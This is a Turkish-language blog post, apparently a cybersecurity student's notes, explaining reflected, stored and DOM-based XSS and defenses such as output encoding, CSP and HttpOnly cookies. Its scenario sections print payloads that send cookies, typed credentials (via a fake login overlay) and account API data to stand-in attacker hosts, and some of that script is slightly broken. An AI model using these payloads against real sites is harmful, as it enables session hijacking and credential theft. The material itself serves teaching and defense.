# XSS Nedir ve Neden Hâlâ Tehlikeli? | Bir Siber Güvenlik Öğrencisinin Notları

- **Source URL:** https://medium.com/@yusufbarut210/xss-nedir-ve-neden-h%C3%A2l%C3%A2-tehlikeli-bir-siber-g%C3%BCvenlik-%C3%B6%C4%9Frencisinin-notlar%C4%B1-0c9a89b3ad14?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20260518115335/https://medium.com/@yusufbarut210/xss-nedir-ve-neden-h%C3%A2l%C3%A2-tehlikeli-bir-siber-g%C3%BCvenlik-%C3%B6%C4%9Frencisinin-notlar%C4%B1-0c9a89b3ad14
- **Fetched:** 2026-11-19
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/13581 (id 13581)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# **XSS Nedir ve Neden Hâlâ Tehlikeli? | Bir Siber Güvenlik Öğrencisinin Notları**

Bu yazı, web güvenliği öğrenme sürecimde tuttuğum teknik notların bir parçasıdır. Amaç yalnızca XSS ’i anlatmak değil, gerçek dünyada neden hâlâ kritik bir tehdit olduğunu anlamaktır.

## XSS Nedir ve Neden Hâlâ Tehlikeli?

Web güvenliği öğrenmeye başladığımda her şey oldukça masum görünüyordu. HTML ve CSS öğreniyor, basit sayfalar oluşturuyor, input alanları ekliyordum. Bir süre sonra küçük ama önemli bir şey fark ettim: Kullanıcıdan alınan veri her zaman beklediğimiz gibi davranmıyordu.

HTML Injection konusunu öğrenirken olayın sadece “veri almak” olmadığını anlamaya başladım. Çünkü kullanıcı bazen yalnızca veri göndermiyor, doğrudan sayfanın davranışını değiştirebiliyordu.

Daha sonra bunun çok daha ciddi bir versiyonuyla tanıştım: XSS (Cross Site Scripting).

İlk başta basit bir uyarı penceresi gibi görünse de arka plandaki mantığı düşündüğümde olayın aslında ne kadar ciddi olduğunu fark ettim. Çünkü burada hedef çoğu zaman sistem değil, doğrudan kullanıcıydı.

O anda şunu anladım: Web güvenliği sadece kod yazmakla ilgili değil; yazılan kodun saldırgan bakış açısıyla nasıl kullanılabileceğini düşünmekle ilgiliydi.

**Peki XSS Tam Olarak Nedir?**

Basitçe anlatmak gerekirse XSS (Cross Site Scripting), saldırganın bir web uygulamasına zararlı kod ekleyerek bu kodun diğer kullanıcıların tarayıcısında çalışmasını sağlamasıdır. Çoğu zaman JavaScript kullanılır. Bu nedenle saldırının hedefi doğrudan sunucu değil, uygulamayı ziyaret eden kullanıcılardır.

XSS saldırıları genellikle basit bir süreç üzerinden gerçekleşir:

- Saldırgan, kullanıcı girdisinin kontrol edilmediği bir alan bulur.
- Bu alana zararlı bir script kodu ekler.
- Web uygulaması bu girdiyi filtrelemeden sayfaya geri yansıtır veya saklar.

Bu noktada kullanıcı, farkında olmadan saldırganın kodunu çalıştırmış olur. Bu sayede saldırganlar:

- Kullanıcının çerez bilgilerine erişebilir,
- Oturum bilgilerini ele geçirebilir,
- Sahte giriş ekranları gösterebilir,
- Sayfa içeriğini değiştirebilir,
- Kullanıcıları zararlı sayfalara yönlendirebilir.

Kısacası XSS saldırıları, küçük görünen bir input alanının bile ciddi güvenlik risklerine dönüşebileceğini gösteren en önemli örneklerden biridir.

Yukarıdaki diyagram, XSS saldırılarının temel çalışma mantığını göstermektedir. Kullanıcıdan alınan verinin filtrelenmeden web sayfasına yansıtılması, saldırganın zararlı script kodlarını diğer kullanıcıların tarayıcısında çalıştırabilmesine neden olabilir. Görselde özellikle Reflected XSS yapısına benzer bir akış örneği gösterilmektedir.

## Reflected XSS Nedir?

XSS konusunu öğrenirken ilk karşıma çıkan tür Reflected XSS olmuştu. Çünkü bu tür, XSS mantığını anlamak için en temel örneklerden biridir.

Reflected XSS saldırılarında zararlı payload (yük) kalıcı olarak saklanmaz. Saldırgan tarafından hazırlanan veri genellikle:

· URL parametreleri,

· arama kutuları,

· form alanları

gibi giriş noktaları üzerinden uygulamaya gönderilir.

Eğer web uygulaması kullanıcıdan aldığı veriyi herhangi bir filtreleme veya güvenlik kontrolü uygulamadan tekrar kullanıcıya yansıtıyorsa, saldırganın eklediği script kodu tarayıcı tarafından normal bir içerik gibi çalıştırılabilir. Bu durum Reflected XSS zafiyetine yol açabilir.

Basit bir örnek:

`<script>alert("XSS")</script>`
Eğer uygulama bu girdiyi doğrudan sayfaya basıyorsa tarayıcı bu kodu çalıştıracaktır.

Reflected XSS saldırılarında genellikle kullanıcıların özel olarak hazırlanmış bir bağlantıya tıklaması gerekir. Bu nedenle saldırılar çoğu zaman:

· sahte e-postalar,

· sosyal mühendislik saldırıları,

· zararlı bağlantılar

ile birlikte kullanılır.

İlk bakışta yalnızca ekranda çıkan basit bir “alert” penceresi gibi görünse de gerçek senaryolarda:

· oturum bilgileri çalınabilir,

· kullanıcı farklı sayfalara yönlendirilebilir,

· sahte giriş formları gösterilebilir,

· kullanıcı işlemleri manipüle edilebilir.

Bu yüzden Reflected XSS, küçük görünen bir input kontrol hatasının bile ciddi güvenlik risklerine dönüşebileceğini gösteren önemli örneklerden biridir.

## Search Reflection Senaryosu

Birçok web uygulamasında arama yaptıktan sonra sayfa şu şekilde cevap verir:

`You searched for: test`
Bu tür sayfalar genellikle kullanıcı girdisini doğrudan ekrana yansıtır.

Eğer uygulama girdiyi filtrelemiyorsa saldırgan şu bağlantıyı oluşturabilir:

`https://example.com/search?q=<script>fetch('https://attacker.com/'+document.cookie)</script>`
Kullanıcı bu linke tıkladığında:

- Sayfa normal görünür
- Ancak tarayıcı arka planda script çalıştırır
- Kullanıcının oturum çerezi saldırgana gönderilebilir

Burada kritik nokta:

👉 Sistem hacklenmez

👉 Kullanıcı tarayıcısı saldırı aracına dönüşür

Bu nedenle Reflected XSS saldırıları çoğu zaman sosyal mühendislik ile birlikte kullanılır.

**Stored XSS Nedir?**

Stored XSS saldırılarında zararlı payload, uygulama içerisinde kalıcı olarak saklanır. Saldırgan tarafından gönderilen zararlı kod genellikle:

- veritabanına,
- yorum alanlarına,
- forum gönderilerine,
- kullanıcı profillerine,
- ziyaretçi defterlerine

kaydedilebilir.

Sorun tam olarak burada başlar. Web uygulaması kullanıcıdan aldığı veriyi güvenli şekilde filtrelemeden veya temizlemeden depoluyorsa, saldırganın eklediği script kodu uygulamayı ziyaret eden diğer kullanıcıların tarayıcılarında çalıştırılabilir.

Basit bir örnek:

`<script>alert("Stored XSS")</script>`
Eğer bu payload bir yorum alanına kaydedilmişse, ilgili sayfayı ziyaret eden her kullanıcı bu script ile karşılaşabilir.

Stored XSS saldırıları Reflected XSS’e göre daha tehlikelidir çünkü saldırının tekrar tekrar gönderilmesine gerek kalmaz. Zararlı içerik sistem içerisinde saklandığı için kullanıcılar sayfayı her ziyaret ettiğinde saldırı otomatik olarak tetiklenebilir.

Gerçek senaryolarda saldırganlar:

- kullanıcı oturumlarını ele geçirebilir,
- sahte giriş formları gösterebilir,
- kullanıcıları farklı sayfalara yönlendirebilir,
- tarayıcı üzerinde zararlı işlemler gerçekleştirebilir.

Özellikle kullanıcı içeriklerinin yoğun olduğu:

- forum sistemleri,
- bloglar,
- sosyal medya platformları,
- yorum sistemleri

Stored XSS saldırıları açısından yüksek risk taşıyabilir.

Bu nedenle kullanıcıdan alınan verilerin yalnızca kaydedilmesi değil, aynı zamanda güvenli şekilde işlenmesi ve filtrelenmesi de büyük önem taşır.

## DOM-Based XSS Nedir?

## Yorum Sistemi Senaryosu

Bir blog sitesinde kullanıcıların yorum yapabildiğini düşünelim.

Normal kullanıcı:

`Harika bir yazı olmuş!`
Saldırgan ise şu girdiyi gönderir:

`<img src=x onerror="fetch('https://attacker.com/log?c='+document.cookie)">`
Eğer uygulama bu girdiyi filtrelemeden veritabanına kaydederse:

- Sayfayı ziyaret eden HER kullanıcı
- farkında olmadan script çalıştırır
- saldırgan birçok kullanıcının oturum bilgisine erişebilir

Stored XSS’in tehlikesi burada ortaya çıkar:

✅ saldırı tek sefer yapılır

❌ etkisi sürekli devam eder

Bu yüzden Stored XSS bug bounty platformlarında yüksek önem derecesine sahiptir.

## DOM-Based XSS Nedir?

Uygulama kullanıcıdan aldığı veriyi kontrol etmeden DOM yapısı içerisine ekliyorsa, saldırgan tarafından gönderilen zararlı kod tarayıcı üzerinde çalıştırılabilir.

Bu saldırılar çoğu zaman:

· URL fragmentleri (# işaretinden sonraki kısım),

· kullanıcı girdileri,

· dinamik JavaScript işlemleri

üzerinden gerçekleşebilir.

Bazı durumlarda yapılan işlem doğrudan sunucuya bile gitmeden tamamen tarayıcı üzerinde çalışabilir.

Basit bir örnek:

`<img src=x onerror=alert("DOM XSS")>`
Eğer uygulama bu girdiyi kontrol etmeden sayfa içerisine yerleştiriyorsa tarayıcı ilgili JavaScript kodunu çalıştırabilir.

DOM-Based XSS saldırıları bazen diğer XSS türlerine göre fark edilmesi daha zor saldırılar olabilir. Çünkü bazı durumlarda işlemler tamamen tarayıcı üzerinde gerçekleşir.

Gerçek senaryolarda saldırganlar:

· kullanıcı oturumlarını ele geçirebilir,

· kullanıcıyı sahte sayfalara yönlendirebilir,

· tarayıcı üzerinde zararlı işlemler gerçekleştirebilir,

· sayfa içeriğini manipüle edebilir.

DOM-Based XSS riskleri özellikle modern web uygulamalarında dikkatle ele alınmalıdır. Bu yüzden kullanıcıdan alınan verilerin yalnızca sunucu tarafında değil, istemci tarafında da güvenli şekilde işlenmesi büyük önem taşır.

## Modern SPA Uygulaması Senaryosu

Modern JavaScript uygulamaları URL parametrelerini sıkça kullanır.

Örneğin:

`https://example.com/profile#username=hello`
Frontend kodu şu şekilde olabilir:

```
document.getElementById("name").innerHTML =
location.hash.substring(1);
```
Saldırgan şu URL’yi üretir:

`https://example.com/profile#<img src=x onerror=alert(1)>`
Sunucu tarafında hiçbir sorun yoktur.

Ama:

- JavaScript veriyi DOM içine ekler
- Tarayıcı zararlı kodu çalıştırır

DOM XSS’in zor tarafı:

👉 loglarda görünmeyebilir

👉 tamamen client-side gerçekleşebilir

Bu yüzden modern web uygulamalarında hâlâ ciddi risk oluşturur.

## XSS Türlerinin Karşılaştırılması

Reflected XSS genellikle anlık saldırılar için kullanılırken, Stored XSS çok daha kalıcı sonuçlar doğurabilir. DOM-Based XSS ise modern JavaScript yapılarında fark edilmesi daha zor saldırı türlerinden biridir.

Bu üç saldırı türünün ortak noktası ise kullanıcıdan alınan verilerin güvenli şekilde filtrelenmeden işlenmesidir.

XSS saldırıları yıllardır bilinen güvenlik açıkları arasında yer alsa da günümüzde hâlâ ciddi risk oluşturmaya devam etmektedir. Reflected, Stored ve DOM-Based XSS saldırıları farklı çalışma mantıklarına sahip olsa da ortak noktaları kullanıcıdan alınan verilerin güvenli şekilde işlenmemesidir.

Modern web uygulamalarında güvenlik yalnızca uygulamanın çalışmasıyla değil, kullanıcı verilerinin ne kadar güvenli işlendiğiyle de doğrudan ilişkilidir. Bu nedenle geliştiricilerin kullanıcı girdilerini doğru şekilde filtrelemesi, güvenli kodlama standartlarını uygulaması ve istemci tarafındaki işlemleri dikkatli yönetmesi büyük önem taşır.

## Gerçek Dünya XSS Senaryosu — Fake Login (Phishing)

XSS saldırılarının en tehlikeli yönlerinden biri yalnızca JavaScript çalıştırmak değil, aynı zamanda kullanıcıyı manipüle edebilmektir. Gerçek saldırı senaryolarında amaç çoğu zaman ekranda bir uyarı göstermek değil, kullanıcının güvenini kazanarak bilgilerini ele geçirmektir.

Özellikle Stored veya DOM-Based XSS açıklarında saldırganlar sayfanın içine sahte arayüzler yerleştirebilir. Bu arayüzler gerçek bir uygulama ekranı gibi görünür ve kullanıcıdan tekrar giriş yapmasını isteyebilir.

Aşağıdaki örnek, XSS üzerinden gerçekleştirilebilecek bir fake login (phishing) senaryosunu göstermektedir:

```
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">
  <h3>Session expired</h3>
  <input placeholder="Username">
  <input type="password" placeholder="Password">
  <button onclick="fetch('https://attacker.com/steal?u='+document.querySelectorAll('input')[0].value+'&p='+document.querySelectorAll('input')[1].value)">
    Login
  </button>
</div>
```
Bu kod çalıştırıldığında sayfanın tamamını kaplayan sahte bir giriş ekranı oluşturulur. Kullanıcı kendisini gerçek bir oturum ekranında sanarak bilgilerini girer.

Butona tıklandığında ise girilen kullanıcı adı ve şifre bilgileri saldırganın kontrol ettiği bir sunucuya gönderilir.

## XSS Zincir Senaryosu (Token Ele Geçirme + API Abuse)

Gerçek dünyada XSS saldırıları çoğu zaman tek bir alert çıktısı üretmek için değil, kullanıcının tarayıcı oturumunu ele geçirmek ve uygulama içinde yetkili işlemler yapmak için kullanılır.

Özellikle modern web uygulamalarında saldırganlar sadece cookie çalmak yerine, kullanıcı adına API çağrıları gerçekleştirmeyi hedefler.

Aşağıdaki örnek, XSS’in gerçek bir saldırı zincirinde nasıl kullanılabileceğini göstermektedir:

```
<script>
fetch("/api/user")
  then(res => res.json())
    then(data => {
      fetch("https://attacker.com/collect", {
        method: "POST",
         body: JSON.stringify(data)
    });
  });
</script>
```
```
<!-- XSS Chain Example: Session Hijacking + API Abuse -->
<script>
// 1. Kullanıcının session bilgisi değil, API verisi hedefleniyor
fetch("/api/account")
  then(res => res.json())
    then(data => {
    // 2. Saldırgan veriyi dışarı exfiltrate ediyor
    navigator.sendBeacon(
      "https://attacker.example/collect",
      JSON.stringify({
        account: data,
        cookies: document.cookie,
        url: location.href
      })
    );
    // 3. Sessizce DOM manipülasyonu (kullanıcı fark etmez)
    document.body.innerHTML =
      "<h2>Security Check Required</h2>" +
      "<p>Please re-login to continue</p>";
  });
</script>
```
## Neden XSS Hâlâ Tehlikeli?

Peki herkes XSS’i biliyorken neden hâlâ tehlikelidir?

Bunun en önemli nedeni, XSS saldırılarında hedefin çoğu zaman doğrudan sistem değil, kullanıcı olmasıdır. Sunucu ele geçirilmese bile, kullanıcı tarayıcısında çalışan zararlı kod saldırgan için yeterli olabilir.

Başarılı bir XSS saldırısı sonucunda saldırgan:

- kullanıcı oturum bilgilerini ele geçirebilir,
- çerez (cookie) verilerine erişebilir,
- sahte giriş ekranları gösterebilir,
- kullanıcıyı zararlı web sitelerine yönlendirebilir,
- kullanıcı adına istem dışı işlemler gerçekleştirebilir.

Üstelik kullanıcı çoğu zaman saldırıya uğradığını fark etmez. Çünkü zararlı script, uygulamanın normal bir parçası gibi çalışır ve güvenilir bir web sitesi üzerinden çalıştırıldığı için şüphe uyandırmaz.

Aslında XSS’in tehlikeli olmasının nedeni teknik olarak karmaşık olması değildir. Asıl tehlike, saldırganın güvenilir görünen bir web uygulamasını kullanıcıya karşı bir saldırı aracına dönüştürebilmesidir.

Modern web uygulamalarının giderek daha dinamik hale gelmesi de bu riski artırmaktadır. React, Angular ve Vue gibi modern JavaScript framework’leri kullanıcı deneyimini önemli ölçüde geliştirirken, istemci tarafında çalışan JavaScript kodlarının miktarını da ciddi şekilde artırmıştır.

Günümüzde web uygulamaları sürekli olarak kullanıcıdan veri almakta, bu verileri DOM içerisine eklemekte ve anlık olarak işlemektedir. Kullanıcı girdisinin yeterli doğrulama ve güvenlik kontrollerinden geçirilmemesi, özellikle DOM-Based XSS saldırılarının daha yaygın hale gelmesine neden olabilmektedir.

Bu nedenle XSS yalnızca eğitim ortamlarında gösterilen basit bir “alert” penceresi olarak değerlendirilmemelidir. Gerçek dünyada tek bir doğrulanmamış kullanıcı girdisi bile güvenilir bir web uygulamasını saldırgan için etkili bir saldırı platformuna dönüştürebilir.

XSS saldırılarının yıllardır varlığını sürdürmesinin temel nedeni teknolojinin gelişmesi değil, geliştiricilerin hâlâ kullanıcı girdisini güvenli varsayma eğilimidir. Oysa web güvenliğinde en önemli prensiplerden biri şudur:

Kullanıcıdan gelen hiçbir veri varsayılan olarak güvenilir değildir.

Web güvenliği yalnızca uygulamanın çalışmasını sağlamak değil, aynı zamanda uygulamanın nasıl kötüye kullanılabileceğini de düşünmeyi gerektirir.

## XSS Saldırılarına Karşı Nasıl Korunulur?

XSS saldırılarının temel nedeni çoğu zaman karmaşık sistem hataları değil, kullanıcıdan alınan verilerin güvenli şekilde işlenmemesidir. Bu nedenle korunma yöntemlerinin büyük bölümü, kullanıcı girdilerinin doğru doğrulanması ve güvenli şekilde işlenmesine dayanır.

Güvenli web uygulamaları geliştirmek için aşağıdaki temel prensipler kritik önem taşır.

## Input Validation (Girdi Doğrulama)

Kullanıcıdan alınan tüm veriler uygulama içerisinde kullanılmadan önce doğrulanmalıdır. Uygulama yalnızca beklenen veri tiplerini kabul etmeli, beklenmeyen karakterler veya zararlı içerikler işlenmeden önce kontrol edilmelidir.

Örneğin:

· sayı beklenen bir alanda yalnızca sayısal veri kabul edilmesi,

· e-posta alanlarında format doğrulaması yapılması,

· gereksiz HTML veya script girişlerinin engellenmesi

saldırı yüzeyini önemli ölçüde azaltır.

Ancak unutulmamalıdır ki input validation tek başına yeterli değildir; ek güvenlik önlemleriyle birlikte kullanılmalıdır.

## Output Encoding (Çıktı Kodlama)

Kullanıcıdan gelen veriler doğrudan HTML içerisine yerleştirilmemelidir. Özel karakterlerin encode edilmesi, tarayıcının bu verileri çalıştırılabilir kod yerine düz metin olarak yorumlamasını sağlar.

Örneğin:

· `<script>` yerine `<script>`

şeklinde gösterim yapılması, script kodunun çalıştırılmasını engelleyebilir.

XSS’e karşı en etkili savunmalardan biri doğru output encoding uygulamaktır.

## Content Security Policy (CSP)

Content Security Policy (CSP), tarayıcıya hangi kaynaklardan script çalıştırılabileceğini belirleyen güçlü bir güvenlik mekanizmasıdır.

Doğru yapılandırılmış bir CSP politikası:

· bilinmeyen script kaynaklarını engelleyebilir,

· inline JavaScript kullanımını sınırlandırabilir,

· başarılı bir XSS saldırısının etkisini azaltabilir.

CSP tek başına bir çözüm değildir, ancak savunma katmanlarını güçlendiren önemli bir koruma mekanizmasıdır.

## Güvenli JavaScript Kullanımı

Modern web uygulamalarında XSS risklerinin önemli bir kısmı istemci tarafındaki JavaScript işlemlerinden kaynaklanır.

Kullanıcı girdilerinin aşağıdaki riskli yapılarda doğrudan kullanılmasından kaçınılmalıdır:

· `innerHTML`

· `document.write()`

· `eval()`

Bu yöntemler yerine güvenli DOM manipülasyonu sağlayan alternatifler tercih edilmelidir.

## HttpOnly Cookie Kullanımı

HttpOnly özelliği aktif olan çerezlere JavaScript üzerinden erişilemez. Bu sayede başarılı bir XSS saldırısı gerçekleşse bile saldırganın kullanıcı oturum çerezlerini ele geçirmesi zorlaşır.

Bu yaklaşım saldırıyı tamamen engellemese de etkisini ciddi şekilde azaltır.

## Framework Güvenlik Önlemlerini Doğru Kullanmak

Modern framework’ler belirli güvenlik mekanizmalarını varsayılan olarak sunsa da bu durum uygulamanın otomatik olarak güvenli olduğu anlamına gelmez.

React, Angular veya Vue gibi framework’lerde:

· kullanıcı girdileri dikkatli işlenmeli,

· güvenli render yöntemleri tercih edilmeli,

· geliştirici tarafından eklenen özel JavaScript kodları denetlenmelidir.

Framework’ler güvenliği kolaylaştırır, ancak güvenliği garanti etmez.

## Sonuç

XSS saldırılarından korunmanın temelinde tek bir prensip vardır:

Kullanıcıdan gelen hiçbir veri varsayılan olarak güvenilir değildir.

Güvenli yazılım geliştirme süreçlerinde hem sunucu tarafı hem de istemci tarafı birlikte değerlendirilmelidir. Güvenlik, uygulama tamamlandıktan sonra eklenen bir özellik değil, geliştirme sürecinin başlangıcından itibaren düşünülmesi gereken bir yaklaşımdır.

Bugün XSS saldırıları hâlâ milyonlarca kullanıcıyı etkileyebiliyorsa bunun nedeni saldırıların çok karmaşık olması değil, kullanıcı girdilerinin hâlâ yeterince dikkatli işlenmemesidir.

Web güvenliğinde bazen en büyük riskler, en küçük görünen input alanlarında ortaya çıkabilir.

#CyberSecurity #XSS #WebSecurity #OWASP #JavaScript #InfoSec #SiberGüvenlik
